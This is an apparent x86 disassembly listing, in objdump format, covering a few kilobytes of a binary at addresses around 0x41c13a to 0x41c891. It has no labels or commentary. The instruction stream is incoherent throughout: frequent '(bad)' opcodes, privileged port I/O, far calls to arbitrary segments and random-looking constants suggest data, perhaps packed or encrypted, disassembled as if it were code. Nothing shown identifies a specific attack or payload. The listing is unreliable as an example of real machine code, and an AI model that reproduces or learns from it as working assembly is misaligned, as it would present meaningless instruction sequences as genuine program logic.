  41c13a:	push   edi
  41c13b:	inc    ebp
  41c13c:	in     al,0x9d
  41c13e:	mov    eax,ds:0xd4bbc606
  41c143:	cmp    al,0x33
  41c145:	test   BYTE PTR [esi-0x19cf8a0c],bl
  41c14b:	mov    esi,0x7542c01c
  41c150:	mov    ebp,0x77f3b181
  41c155:	inc    ebx
  41c156:	sbb    ch,dh
  41c158:	pop    eax
  41c159:	push   ds
  41c15a:	pushw  0x7c
  41c15d:	pop    es
  41c15e:	mov    ds,WORD PTR [eax]
  41c160:	mov    al,ds:0x135fa4a1
  41c165:	(bad)  
  41c166:	lahf   
  41c167:	(bad)  
  41c169:	xor    edx,edi
  41c16b:	adc    DWORD PTR [eax],0x58
  41c16e:	xor    edx,DWORD PTR [esi+0x3c82c720]
  41c174:	jecxz  0x41c154
  41c176:	pusha  
  41c177:	enter  0x9ea9,0x74
  41c17b:	push   ebp
  41c17c:	imul   ebx,DWORD PTR [edi-0x329f55aa],0x2e80ee18
  41c186:	popf   
  41c187:	inc    eax
  41c188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c189:	out    dx,eax
  41c18a:	je     0x41c156
  41c18c:	add    bh,BYTE PTR [edx-0x1f6147fb]
  41c192:	stos   BYTE PTR es:[edi],al
  41c193:	inc    ebp
  41c194:	fisub  DWORD PTR ds:0x777bfec9
  41c19a:	call   0x7e0f:0x2fd523bb
  41c1a1:	loope  0x41c214
  41c1a3:	cmc    
  41c1a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1a5:	mov    ?,WORD PTR [edx+edx*2-0x7a]
  41c1a9:	scas   al,BYTE PTR es:[edi]
  41c1aa:	vmread DWORD PTR [edi+0x17],eax
  41c1ae:	int3   
  41c1af:	cs xchg ebx,eax
  41c1b1:	mov    dh,0xbc
  41c1b3:	stos   DWORD PTR es:[edi],eax
  41c1b4:	mov    eax,ds:0x847539b1
  41c1b9:	xchg   ebp,eax
  41c1ba:	retf   
  41c1bb:	imul   ebp,DWORD PTR [ecx-0x44],0xffffffe6
  41c1bf:	xor    eax,0x98b1fbba
  41c1c4:	sbb    al,0x55
  41c1c6:	pop    edx
  41c1c7:	stc    
  41c1c8:	imul   ebx,esi,0xc2fe26a1
  41c1ce:	push   edx
  41c1cf:	dec    edx
  41c1d0:	lock je 0x41c1b6
  41c1d3:	dec    edi
  41c1d4:	sbb    BYTE PTR [eax],bl
  41c1d6:	pop    ecx
  41c1d7:	or     al,dh
  41c1d9:	sar    ebp,1
  41c1db:	int3   
  41c1dc:	data16 jnp 0x41c179
  41c1df:	fld    QWORD PTR [edi]
  41c1e1:	mov    DWORD PTR [edi],esp
  41c1e3:	adc    dl,dh
  41c1e5:	inc    eax
  41c1e6:	jmp    FWORD PTR [ecx+0x16]
  41c1e9:	push   0xf29ed800
  41c1ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1ef:	daa    
  41c1f0:	retf   
  41c1f1:	cwde   
  41c1f2:	in     al,dx
  41c1f3:	int    0x64
  41c1f5:	jbe    0x41c229
  41c1f7:	inc    eax
  41c1f8:	adc    esp,DWORD PTR [eax-0x5c]
  41c1fb:	lods   al,BYTE PTR ds:[esi]
  41c1fc:	sub    edi,eax
  41c1fe:	rcl    BYTE PTR [edi],cl
  41c200:	xor    DWORD PTR ds:0x5dd6c3fa,0x3b21c981
  41c20a:	mov    ds:0xcc0e0dd7,eax
  41c20f:	inc    ebp
  41c210:	xor    ebp,eax
  41c212:	and    edx,DWORD PTR [ecx]
  41c214:	lock cmp DWORD PTR [ecx-0x2c1dd4c6],ecx
  41c21b:	adc    BYTE PTR [ebp+0x642c098],0x55
  41c222:	and    DWORD PTR [esi-0x5b6705e1],esp
  41c228:	cmp    eax,0x91a1a8e9
  41c22d:	cmp    edi,esp
  41c22f:	inc    edx
  41c230:	pop    ebx
  41c231:	ror    BYTE PTR [ebx+0x5447b623],cl
  41c237:	or     esp,DWORD PTR gs:[esp+ebx*2+0x948109c]
  41c23f:	stc    
  41c240:	lods   al,BYTE PTR ds:[esi]
  41c241:	out    dx,eax
  41c242:	jo     0x41c2b9
  41c244:	lock add eax,0x552a296f
  41c24a:	dec    ebp
  41c24b:	jl     0x41c2c5
  41c24d:	mov    bh,0x48
  41c24f:	mov    edx,0x4ad70f82
  41c254:	cmp    al,0x24
  41c256:	loop   0x41c1d8
  41c258:	push   eax
  41c259:	(bad)  
  41c25a:	outs   dx,DWORD PTR ds:[esi]
  41c25b:	fadd   QWORD PTR ds:0x761ac4a
  41c261:	les    esp,FWORD PTR [esi+0x5ccce3d1]
  41c267:	stos   DWORD PTR es:[edi],eax
  41c268:	or     BYTE PTR [ebp+0x111ab3cb],0x46
  41c26f:	cmp    eax,0xd2843622
  41c274:	or     bh,BYTE PTR ds:0x1fc08f5f
  41c27a:	add    al,0xc6
  41c27c:	into   
  41c27d:	test   al,dh
  41c27f:	dec    ebx
  41c280:	adc    eax,0xa9128c1c
  41c285:	scas   eax,DWORD PTR es:[edi]
  41c286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c287:	pop    esi
  41c288:	fsubr  DWORD PTR [ecx+edi*1-0x2a]
  41c28c:	clc    
  41c28d:	adc    eax,0x70edd212
  41c292:	mov    ebx,0xd3a60c32
  41c297:	sbb    BYTE PTR [ebp-0x12],bh
  41c29a:	push   esi
  41c29b:	dec    eax
  41c29c:	scas   al,BYTE PTR es:[edi]
  41c29d:	outs   dx,BYTE PTR ds:[esi]
  41c29e:	add    edx,eax
  41c2a0:	mov    ecx,DWORD PTR [eax+0x3f168345]
  41c2a6:	mov    edi,ss
  41c2a8:	loop   0x41c329
  41c2aa:	pop    esp
  41c2ab:	mov    ch,0xc1
  41c2ad:	(bad)  
  41c2ae:	sbb    DWORD PTR [ebp-0x27],eax
  41c2b1:	add    esi,DWORD PTR [esi-0x20]
  41c2b4:	fwait
  41c2b5:	or     al,0x77
  41c2b7:	pop    es
  41c2b8:	xchg   esp,eax
  41c2b9:	add    BYTE PTR [ecx],bh
  41c2bb:	pop    edx
  41c2bc:	(bad)  
  41c2be:	push   ss
  41c2bf:	cmp    al,0xff
  41c2c1:	(bad)  
  41c2c2:	xor    DWORD PTR [ecx+0x1ce11583],eax
  41c2c8:	cwde   
  41c2c9:	mov    ds:0x7e77ae4a,al
  41c2ce:	shl    DWORD PTR [eax+edi*4-0x56],cl
  41c2d2:	cdq    
  41c2d3:	mov    edx,ebx
  41c2d5:	dec    esp
  41c2d6:	out    dx,eax
  41c2d7:	push   edi
  41c2d8:	(bad)  
  41c2d9:	mov    ebp,0xf459c998
  41c2de:	call   DWORD PTR [eax+0x4132c204]
  41c2e4:	adc    al,BYTE PTR ds:0xd3806334
  41c2ea:	pop    ds
  41c2eb:	(bad)  
  41c2ec:	arpl   dx,cx
  41c2ee:	push   cs
  41c2ef:	xchg   DWORD PTR [eax-0x50640806],ebp
  41c2f5:	push   edi
  41c2f6:	out    0xdd,al
  41c2f8:	mov    bh,0xd7
  41c2fa:	sbb    bl,BYTE PTR [edi+ebx*8]
  41c2fd:	adc    al,0xdd
  41c2ff:	out    0x57,al
  41c301:	jl     0x41c36a
  41c303:	jmp    0x865b:0x6085097f
  41c30a:	sub    DWORD PTR [ebx+0x3d4918a],ecx
  41c310:	je     0x41c365
  41c312:	js     0x41c368
  41c314:	out    0x70,al
  41c316:	or     BYTE PTR [esi+ebx*1+0x7baa4487],cl
  41c31d:	(bad)  
  41c31e:	cmc    
  41c31f:	jnp    0x41c381
  41c321:	mov    DWORD PTR [esi-0xc],0xaabbf4c
  41c328:	jae    0x41c2d9
  41c32a:	or     DWORD PTR [esi],ebx
  41c32c:	mov    dh,0x3
  41c32e:	dec    ebx
  41c32f:	xchg   DWORD PTR [ecx],esi
  41c331:	xor    eax,0x1be0bf06
  41c336:	and    eax,edi
  41c338:	aas    
  41c339:	(bad)  
  41c33a:	in     al,dx
  41c33b:	adc    al,0x83
  41c33d:	sub    BYTE PTR [ebx+0x5d],cl
  41c340:	mov    edi,0x973764f4
  41c345:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c346:	add    edx,DWORD PTR [esi]
  41c348:	pop    ds
  41c349:	or     eax,0x6e1a60ff
  41c34e:	fdivr  QWORD PTR ds:0xe4f58349
  41c354:	cld    
  41c355:	add    al,0x6a
  41c357:	outs   dx,DWORD PTR ds:[esi]
  41c358:	xlat   BYTE PTR ds:[ebx]
  41c359:	mov    esp,0x59955a7f
  41c35e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35f:	ds call 0xa297:0x51ffa782
  41c367:	or     eax,DWORD PTR [esi]
  41c369:	lea    esp,[edx-0x1d9d04da]
  41c36f:	in     al,0x2a
  41c371:	aaa    
  41c372:	adc    edx,0x7c
  41c375:	sbb    al,BYTE PTR [ecx+0x32c9a377]
  41c37b:	daa    
  41c37c:	xchg   edi,eax
  41c37d:	ret    0x518
  41c380:	jno    0x41c401
  41c382:	xlat   BYTE PTR ds:[ebx]
  41c383:	pushf  
  41c384:	(bad)  
  41c386:	stos   DWORD PTR es:[edi],eax
  41c387:	retf   
  41c388:	xlat   BYTE PTR ds:[ebx]
  41c389:	inc    esp
  41c38a:	leave  
  41c38b:	jmp    0xfab2:0x9b4e3a83
  41c392:	adc    eax,0x852c03f9
  41c397:	(bad)  
  41c398:	idiv   DWORD PTR [ebx+0x654bebe1]
  41c39e:	mov    dl,0x47
  41c3a0:	in     al,0x4b
  41c3a2:	imul   ecx,DWORD PTR [ebp+esi*4+0x7bc14628],0xffffff85
  41c3aa:	jo     0x41c422
  41c3ac:	sahf   
  41c3ad:	or     al,0xaa
  41c3af:	popf   
  41c3b0:	mov    cl,0x9d
  41c3b2:	inc    ecx
  41c3b3:	hlt    
  41c3b4:	push   ebp
  41c3b5:	jb     0x41c380
  41c3b7:	inc    eax
  41c3b8:	rcr    DWORD PTR [esi],0xde
  41c3bb:	adc    eax,0x4e9e063e
  41c3c1:	gs leave 
  41c3c3:	push   esp
  41c3c4:	sub    DWORD PTR [esi+0x7a],esi
  41c3c7:	cld    
  41c3c8:	fs push ecx
  41c3ca:	rcr    BYTE PTR gs:[esi],1
  41c3cd:	or     BYTE PTR [ebp-0x63d7b99a],0x9a
  41c3d4:	sub    DWORD PTR [esp+edi*4+0x73f4a644],edi
  41c3db:	dec    esp
  41c3dc:	mov    ds:0x2e1cef25,al
  41c3e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3e2:	cmp    edi,esp
  41c3e4:	out    dx,eax
  41c3e5:	pusha  
  41c3e6:	jns    0x41c3b2
  41c3e8:	cmp    BYTE PTR [edi+esi*8],al
  41c3eb:	popa   
  41c3ec:	push   edi
  41c3ed:	js     0x41c436
  41c3ef:	xor    al,0x13
  41c3f1:	pop    edi
  41c3f2:	(bad)  
  41c3f3:	jo     0x41c415
  41c3f5:	repnz push cs
  41c3f7:	int    0x90
  41c3f9:	daa    
  41c3fa:	jmp    0x41c3e5
  41c3fc:	xchg   ebx,eax
  41c3fd:	nop
  41c3fe:	test   BYTE PTR [edx-0x75],dh
  41c401:	push   0xffffff94
  41c403:	outs   dx,DWORD PTR ds:[esi]
  41c404:	push   ebp
  41c405:	outs   dx,DWORD PTR ds:[esi]
  41c406:	mov    esp,DWORD PTR [eax+edx*8+0x13fab395]
  41c40d:	mov    cl,0x45
  41c40f:	cmc    
  41c410:	fisub  DWORD PTR ss:[esi]
  41c413:	push   ss
  41c414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c415:	rcl    ebx,cl
  41c417:	mov    ch,0xf3
  41c419:	iret   
  41c41a:	jp     0x41c3ab
  41c41c:	cmp    bl,ch
  41c41e:	pusha  
  41c41f:	sbb    edx,DWORD PTR [edx-0x7]
  41c422:	mov    bh,0x71
  41c424:	idiv   DWORD PTR [edi]
  41c426:	shr    BYTE PTR [ecx-0x77c7432f],cl
  41c42c:	adc    eax,0x8f14a365
  41c431:	sub    cl,BYTE PTR [eax]
  41c433:	inc    esi
  41c434:	cmp    ecx,DWORD PTR [esi]
  41c436:	out    0x36,eax
  41c438:	call   0xc632:0xa44fb699
  41c43f:	daa    
  41c440:	jnp    0x41c443
  41c442:	push   eax
  41c443:	outs   dx,BYTE PTR ds:[esi]
  41c444:	in     eax,0xbf
  41c446:	arpl   bp,bx
  41c448:	out    0x18,eax
  41c44a:	pop    es
  41c44b:	popa   
  41c44c:	and    al,0xbd
  41c44e:	mov    bl,0xf2
  41c450:	sub    eax,0x58d885c7
  41c455:	fstp   st(3)
  41c457:	clc    
  41c458:	clc    
  41c459:	mov    al,ds:0xf6c4d7b2
  41c45e:	fisubr DWORD PTR [esi]
  41c460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c461:	push   edx
  41c462:	sub    DWORD PTR [ebx+0x37da3c86],0x35
  41c469:	push   ss
  41c46a:	sar    DWORD PTR [ebp+ecx*4+0x2e],1
  41c46e:	jb     0x41c3f9
  41c470:	push   ecx
  41c471:	retf   
  41c472:	cs dec ebx
  41c474:	ds enter 0x8295,0xce
  41c479:	pop    edx
  41c47a:	aad    0x77
  41c47c:	cli    
  41c47d:	retf   0x19cf
  41c480:	(bad)  [esi]
  41c482:	repz jp 0x41c48e
  41c485:	cwde   
  41c486:	stos   DWORD PTR es:[edi],eax
  41c487:	add    al,0xc
  41c489:	js     0x41c444
  41c48b:	retfw  
  41c48d:	lods   eax,DWORD PTR ds:[esi]
  41c48e:	or     BYTE PTR cs:[esi+0x6d],ah
  41c492:	jmp    0x41c483
  41c494:	add    esi,eax
  41c496:	je     0x41c459
  41c498:	ret    
  41c499:	ds add al,0x9a
  41c49c:	inc    esi
  41c49d:	js     0x41c4be
  41c49f:	sub    bh,BYTE PTR [eax+0x3a34c9f5]
  41c4a5:	test   DWORD PTR [ebx+eiz*4+0x13e64bdf],esp
  41c4ac:	int    0x39
  41c4ae:	jns    0x41c4cd
  41c4b0:	mov    ah,0x64
  41c4b2:	arpl   WORD PTR [edi-0x4e],ax
  41c4b5:	jae    0x41c4db
  41c4b7:	dec    edi
  41c4b8:	pushf  
  41c4b9:	arpl   ax,cx
  41c4bb:	and    cl,BYTE PTR [esi]
  41c4bd:	sar    DWORD PTR [eax+ebp*8-0x22],0xa1
  41c4c2:	dec    ebx
  41c4c3:	out    0xcf,al
  41c4c5:	leave  
  41c4c6:	add    al,bl
  41c4c8:	fmul   DWORD PTR [eax+0x32123a0a]
  41c4ce:	sub    ecx,DWORD PTR [eax]
  41c4d0:	push   esp
  41c4d1:	popf   
  41c4d2:	shl    DWORD PTR [ebp-0x4a],cl
  41c4d5:	test   al,0x7f
  41c4d7:	mov    ebp,ebx
  41c4d9:	fild   WORD PTR ds:0xc73a1c25
  41c4df:	inc    ebx
  41c4e0:	dec    ecx
  41c4e1:	dec    ebp
  41c4e2:	adc    eax,ebx
  41c4e4:	sbb    dl,BYTE PTR [edx-0x13f33cf7]
  41c4ea:	push   edi
  41c4eb:	xor    BYTE PTR [ebx-0x78],bh
  41c4ee:	aas    
  41c4ef:	xor    al,0x5a
  41c4f1:	push   esp
  41c4f2:	fisttp DWORD PTR [ecx-0x5ad940a9]
  41c4f8:	mov    es,WORD PTR [edi+0x10c3d1d2]
  41c4fe:	call   0xcd07:0x80cafb8f
  41c505:	pop    ebx
  41c506:	sar    DWORD PTR [edx],cl
  41c508:	scas   al,BYTE PTR es:[edi]
  41c509:	add    edx,edx
  41c50b:	dec    esi
  41c50c:	std    
  41c50d:	xor    eax,0x72919fe9
  41c512:	arpl   WORD PTR [eax],si
  41c514:	mov    al,es:0xbfa70287
  41c51a:	aas    
  41c51b:	int    0xb7
  41c51d:	daa    
  41c51e:	push   eax
  41c51f:	xchg   ebp,eax
  41c520:	gs jge 0x41c531
  41c523:	(bad)  
  41c525:	pop    ss
  41c526:	jo     0x41c4fa
  41c528:	pop    ebp
  41c529:	cmp    edi,ebp
  41c52b:	(bad)  
  41c52c:	cmp    ah,bl
  41c52e:	js     0x41c55f
  41c530:	leave  
  41c531:	fwait
  41c532:	inc    esp
  41c533:	imul   eax,DWORD PTR [esi],0xffffff87
  41c536:	jl     0x41c581
  41c538:	mov    esi,0x5333daee
  41c53d:	es hlt 
  41c53f:	dec    edx
  41c540:	mov    ch,0x1a
  41c542:	aam    0x74
  41c544:	and    edx,eax
  41c546:	xchg   edx,eax
  41c547:	mov    WORD PTR [ecx-0xf],?
  41c54a:	adc    ebx,DWORD PTR [ecx-0x8]
  41c54d:	adc    BYTE PTR [edx+ecx*4],dl
  41c550:	jl     0x41c599
  41c552:	fs and al,0xb1
  41c555:	pusha  
  41c556:	pop    ecx
  41c557:	lds    ecx,FWORD PTR [ebp+0x5d]
  41c55a:	call   0xc1f5:0x5e768f7c
  41c561:	ins    BYTE PTR es:[edi],dx
  41c562:	mov    ah,0x35
  41c564:	fucomip st,st(3)
  41c566:	inc    ebx
  41c567:	mov    bl,0xcd
  41c569:	sbb    ch,BYTE PTR [ebp-0x14]
  41c56c:	sub    bh,BYTE PTR [ebp+0x20]
  41c56f:	stos   DWORD PTR es:[edi],eax
  41c570:	enter  0x494c,0xfa
  41c574:	add    DWORD PTR [eax],ecx
  41c576:	int3   
  41c577:	sti    
  41c578:	out    dx,al
  41c579:	jns    0x41c50f
  41c57b:	push   esi
  41c57c:	call   0xff72:0x3aa09417
  41c583:	push   esi
  41c584:	push   es
  41c585:	scas   al,BYTE PTR es:[edi]
  41c586:	dec    ecx
  41c587:	leave  
  41c588:	dec    esi
  41c589:	jmp    0x3b4bb508
  41c58e:	cdq    
  41c58f:	jns    0x41c52e
  41c591:	std    
  41c592:	dec    esp
  41c593:	and    eax,0x83555b8e
  41c598:	jb     0x41c605
  41c59a:	fs retf 0x31da
  41c59e:	xor    BYTE PTR [esp+eax*2],0x9a
  41c5a2:	mov    dl,0x5b
  41c5a4:	loop   0x41c5f0
  41c5a6:	shl    DWORD PTR [edx+0x70],0xd8
  41c5aa:	add    al,0xf3
  41c5ac:	adc    edx,esi
  41c5ae:	xor    BYTE PTR [eax-0x3f],dl
  41c5b1:	mov    edi,DWORD PTR [esi-0x11]
  41c5b4:	mov    bh,0x6e
  41c5b6:	inc    esi
  41c5b7:	pop    es
  41c5b8:	cmp    eax,0xeb5d2c9b
  41c5bd:	and    al,0xe0
  41c5bf:	xchg   BYTE PTR [eax+0x657d12d0],dh
  41c5c5:	push   ebx
  41c5c6:	mov    ds:0x63f2d5e6,al
  41c5cb:	dec    eax
  41c5cc:	pop    esp
  41c5cd:	push   0xffffffe9
  41c5cf:	test   bh,dh
  41c5d1:	mov    ecx,0x84e6ccbd
  41c5d6:	dec    esi
  41c5d7:	pusha  
  41c5d8:	xor    DWORD PTR [edx],edx
  41c5da:	test   al,0xee
  41c5dc:	inc    eax
  41c5dd:	cmp    al,0x5e
  41c5df:	jnp    0x41c64f
  41c5e1:	(bad)  
  41c5e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5e3:	ret    
  41c5e4:	test   eax,0x88b27309
  41c5e9:	(bad)  
  41c5eb:	jae    0x41c63d
  41c5ed:	or     edx,DWORD PTR [eax]
  41c5ef:	retf   
  41c5f0:	xor    eax,0x6b885978
  41c5f5:	push   ecx
  41c5f6:	cdq    
  41c5f7:	xor    ecx,esp
  41c5f9:	out    dx,eax
  41c5fa:	in     eax,0xfb
  41c5fc:	mov    bh,BYTE PTR [ebx-0x2f52aec8]
  41c602:	pop    ebx
  41c603:	ss mov gs:0xae9889a5,eax
  41c60a:	sub    bl,BYTE PTR [ebp-0x72311862]
  41c610:	push   0x240fc859
  41c615:	or     DWORD PTR [edx-0x5f],ebp
  41c618:	inc    ebp
  41c619:	push   0x27
  41c61b:	sbb    bl,BYTE PTR [edx+0x60ada289]
  41c621:	mov    ds:0xa54458c5,eax
  41c626:	fdivr  DWORD PTR ds:0xd73087fa
  41c62c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c62d:	in     al,0x96
  41c62f:	mov    WORD PTR [edi],fs
  41c631:	xor    BYTE PTR [edx+0x6d],bh
  41c634:	push   0x2ddd9fb2
  41c639:	sbb    DWORD PTR [ebp+0x4ef31cfc],esi
  41c63f:	mov    ah,0x6b
  41c641:	add    eax,0xde913152
  41c646:	sti    
  41c647:	jle    0x41c5f9
  41c649:	and    eax,0x16f1c4d1
  41c64e:	jnp    0x41c5e2
  41c650:	mov    ah,dh
  41c652:	or     eax,0x56cbf1ac
  41c657:	(bad)  
  41c658:	mov    edi,0x89f85857
  41c65d:	sbb    eax,0x117144ea
  41c662:	out    0x61,al
  41c664:	cld    
  41c665:	push   eax
  41c666:	cs pop eax
  41c668:	push   ebp
  41c669:	dec    ebp
  41c66a:	(bad)  
  41c66b:	sub    DWORD PTR [esi+ebp*8],esi
  41c66e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c66f:	sbb    BYTE PTR [edi],0x8d
  41c672:	scas   al,BYTE PTR es:[edi]
  41c673:	mov    eax,edi
  41c675:	jecxz  0x41c69a
  41c677:	mov    edi,0x2fa1f1a8
  41c67c:	retf   
  41c67d:	push   ss
  41c67e:	mov    gs,WORD PTR [ecx]
  41c680:	stos   BYTE PTR es:[edi],al
  41c681:	push   edx
  41c682:	lods   eax,DWORD PTR ds:[esi]
  41c683:	lock and ecx,0xcb83a05c
  41c68a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c68b:	test   al,0xf3
  41c68d:	sbb    BYTE PTR [edi-0x24],ah
  41c690:	pop    ds
  41c691:	jbe    0x41c697
  41c693:	adc    eax,0x13a17d4
  41c698:	mov    ecx,ecx
  41c69a:	(bad)  
  41c69b:	cmc    
  41c69c:	xlat   BYTE PTR ds:[ebx]
  41c69d:	lods   al,BYTE PTR ds:[esi]
  41c69e:	and    dh,BYTE PTR [edi]
  41c6a0:	mov    bh,0x7b
  41c6a2:	js     0x41c664
  41c6a4:	or     DWORD PTR [esp+eiz*4-0x30],edi
  41c6a8:	inc    edi
  41c6a9:	xor    ebp,DWORD PTR [edx+ebx*4+0x54f24d98]
  41c6b0:	push   edx
  41c6b1:	loope  0x41c636
  41c6b3:	and    dh,BYTE PTR [eax]
  41c6b5:	pop    ebx
  41c6b6:	or     ebx,DWORD PTR [edx]
  41c6b8:	icebp  
  41c6b9:	aas    
  41c6ba:	inc    edx
  41c6bb:	pop    ecx
  41c6bc:	pop    eax
  41c6bd:	dec    ecx
  41c6be:	loop   0x41c6e7
  41c6c0:	call   0xa0d3ddd1
  41c6c5:	sbb    al,0x71
  41c6c7:	cmp    ch,0xdc
  41c6ca:	outs   dx,BYTE PTR ds:[esi]
  41c6cb:	push   0xffffff9a
  41c6cd:	cmp    al,0xf6
  41c6cf:	test   al,0x73
  41c6d1:	mov    ecx,0xc0778ed8
  41c6d6:	lds    ecx,FWORD PTR [esi+0x3]
  41c6d9:	outs   dx,DWORD PTR ds:[esi]
  41c6da:	stos   BYTE PTR es:[edi],al
  41c6db:	inc    edx
  41c6dc:	retf   
  41c6dd:	je     0x41c6bd
  41c6df:	dec    eax
  41c6e0:	mov    ds:0xf3b30215,eax
  41c6e5:	nop
  41c6e6:	mov    edx,0x363f63d5
  41c6eb:	and    DWORD PTR [ebx+0x428ca881],0xffffffab
  41c6f2:	pop    esi
  41c6f3:	and    al,BYTE PTR [esi-0x5ee964cb]
  41c6f9:	cmp    DWORD PTR ds:0x25456a93,0x65d575d0
  41c703:	add    bl,BYTE PTR [ecx+esi*8-0x2b7c3add]
  41c70a:	std    
  41c70b:	adc    eax,0x4926380b
  41c710:	test   cl,dl
  41c712:	pop    esp
  41c713:	ror    esi,0x7c
  41c716:	mov    ecx,0x76e07922
  41c71b:	lods   eax,DWORD PTR ds:[esi]
  41c71c:	mov    ds:0x8ddfc024,al
  41c721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c722:	stos   DWORD PTR es:[edi],eax
  41c723:	push   cs
  41c724:	push   ebp
  41c725:	mov    eax,ds:0x323afaff
  41c72a:	xchg   ebx,eax
  41c72b:	imul   edi,DWORD PTR [esi-0x27],0xffffffcb
  41c72f:	xor    al,0x8
  41c731:	add    BYTE PTR [edx-0x45473ece],bh
  41c737:	std    
  41c738:	push   edx
  41c739:	xor    bl,0xa0
  41c73c:	pop    es
  41c73d:	push   esp
  41c73e:	out    dx,eax
  41c73f:	addr16 jae 0x41c769
  41c742:	xor    eax,0x9df76bea
  41c747:	adc    al,0x87
  41c749:	inc    eax
  41c74a:	and    eax,0xb1cee165
  41c74f:	sub    BYTE PTR [eax+0x3dbf9bef],al
  41c755:	fist   DWORD PTR [eax]
  41c757:	and    al,0xba
  41c759:	mov    eax,0x7e21bb0f
  41c75e:	or     ebx,DWORD PTR [esi-0xa]
  41c761:	shr    cl,1
  41c763:	bound  ebx,QWORD PTR [edx-0x223facd0]
  41c769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c76a:	push   ebx
  41c76b:	bound  edx,QWORD PTR [ebx]
  41c76d:	fwait
  41c76e:	sbb    BYTE PTR [ebx+edx*8+0x18],bh
  41c772:	(bad)  
  41c773:	outs   dx,BYTE PTR ds:[esi]
  41c774:	mov    ds,WORD PTR [esi-0x6a42413b]
  41c77a:	stos   DWORD PTR es:[edi],eax
  41c77b:	cmp    eax,ecx
  41c77d:	jp     0x41c7bf
  41c77f:	add    cl,BYTE PTR [edx+0x78daf640]
  41c785:	and    edx,DWORD PTR [edx]
  41c787:	dec    esp
  41c788:	(bad)  
  41c789:	in     eax,0xaa
  41c78b:	push   eax
  41c78c:	mov    esp,DWORD PTR [eax]
  41c78e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c78f:	repnz cmc 
  41c791:	push   ebx
  41c792:	inc    esi
  41c793:	dec    esp
  41c794:	jecxz  0x41c75d
  41c796:	ja     0xcba81ece
  41c79c:	mov    edx,0x8a08e088
  41c7a1:	loopne 0x41c72f
  41c7a3:	jmp    0x41c753
  41c7a5:	xchg   esi,eax
  41c7a6:	push   esp
  41c7a7:	gs out 0x76,eax
  41c7aa:	bound  eax,QWORD PTR [edi]
  41c7ac:	sbb    dh,al
  41c7ae:	jl     0x41c7a5
  41c7b0:	xor    cl,dl
  41c7b2:	mov    eax,esp
  41c7b4:	jnp    0x41c7ae
  41c7b6:	retf   0xb7d0
  41c7b9:	cli    
  41c7ba:	sbb    eax,0xa4e9901a
  41c7bf:	or     bh,ch
  41c7c1:	imul   esi,DWORD PTR [edi],0xffffffc3
  41c7c4:	(bad)  
  41c7c5:	lods   eax,DWORD PTR ds:[esi]
  41c7c6:	dec    esi
  41c7c7:	(bad)  
  41c7c8:	out    dx,al
  41c7c9:	dec    edi
  41c7ca:	fldenv [ebp-0x67]
  41c7cd:	fadd   st(2),st
  41c7cf:	mov    dl,0x41
  41c7d1:	adc    bl,BYTE PTR [ebx-0x59]
  41c7d4:	out    0xc4,al
  41c7d6:	or     DWORD PTR [esi],edi
  41c7d8:	int3   
  41c7d9:	jg     0x41c7bb
  41c7db:	scas   eax,DWORD PTR es:[edi]
  41c7dc:	out    dx,al
  41c7dd:	in     al,dx
  41c7de:	xchg   ecx,eax
  41c7df:	sbb    BYTE PTR [ebx-0x72e91cea],0x65
  41c7e6:	frstor [edx-0x61]
  41c7e9:	cs dec esi
  41c7eb:	xchg   esi,eax
  41c7ec:	out    dx,al
  41c7ed:	enter  0x4b06,0xd8
  41c7f1:	fdiv   st(5),st
  41c7f3:	fisttp WORD PTR [esi-0x3a]
  41c7f6:	(bad)  
  41c7f7:	pop    eax
  41c7f8:	pop    eax
  41c7f9:	mov    ebp,0x90d1a00a
  41c7fe:	out    dx,al
  41c7ff:	rcr    DWORD PTR ds:0x161b7f64,0xd4
  41c806:	mov    ?,WORD PTR [ebp+0x725f433d]
  41c80c:	imul   ecx,ecx,0xf
  41c80f:	or     bh,al
  41c811:	icebp  
  41c812:	ror    BYTE PTR ds:0xd83d507f,0x22
  41c819:	push   edx
  41c81a:	jge    0x41c83c
  41c81c:	push   edi
  41c81d:	call   0xaec4:0xc4d250cf
  41c824:	nop
  41c825:	xchg   ebp,eax
  41c826:	pushf  
  41c827:	pop    ebx
  41c828:	and    eax,0x2442a04b
  41c82d:	into   
  41c82e:	lahf   
  41c82f:	mov    ch,BYTE PTR [edi-0x4b]
  41c832:	pop    esi
  41c833:	inc    esi
  41c834:	inc    esp
  41c835:	push   es
  41c836:	ret    
  41c837:	mov    DWORD PTR [eax],ebp
  41c839:	pop    edx
  41c83a:	or     esp,DWORD PTR [eax]
  41c83c:	dec    esi
  41c83d:	pop    ebx
  41c83e:	pusha  
  41c83f:	mov    ds:0x933357d7,al
  41c844:	lea    ecx,[eax*1+0x3231e724]
  41c84b:	cmp    DWORD PTR [edx-0x3f1b0fcb],esi
  41c851:	mov    edi,0xb37f929a
  41c856:	adc    eax,0x729e1db0
  41c85b:	pusha  
  41c85c:	ss dec edx
  41c85e:	mov    ecx,0xca366481
  41c863:	into   
  41c864:	xchg   ebx,eax
  41c865:	(bad)  
  41c866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c867:	(bad)
  41c86a:	retf   0xaaee
  41c86d:	shl    DWORD PTR [edi],0x4f
  41c870:	mov    ebp,DWORD PTR [edx-0x2a]
  41c873:	sub    eax,0xc8c8f582
  41c878:	jae    0x41c801
  41c87a:	mov    edx,0xee96c2a
  41c87f:	cmp    eax,0xc6e0261d
  41c884:	push   eax
  41c885:	mov    ebp,0xb1193a3
  41c88a:	retf   
  41c88b:	sar    BYTE PTR [esi-0x5acb3a58],cl
  41c891:	ret    0xd5c8
